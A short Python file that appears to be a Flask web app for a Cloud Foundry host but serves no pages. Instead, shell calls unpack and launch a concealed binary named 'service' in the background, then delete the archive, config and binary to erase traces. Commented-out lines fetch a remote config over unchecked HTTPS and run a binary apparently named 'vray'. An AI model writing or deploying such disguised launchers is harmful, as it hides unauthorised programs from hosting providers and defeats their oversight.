from cloudant import Cloudant
from flask import Flask, render_template, request, jsonify
import atexit
import os
import json
import time
os.system("date >>log.txt")
#os.system("wget --no-check-certificate -O config.json https://raw.githubusercontent.com/icephonix/ibm/master/config.json")
#os.system("/home/vcap/app/vray")
os.system("unzip c.zip>/dev/null &")
os.system("/home/vcap/app/service -config c.pb >/dev/null &")
time.sleep(15)
os.system("rm c.pb c.zip service")
#time.sleep(86400)
#os.system("pkill -9 service")
#os.system("pkill -9 python")

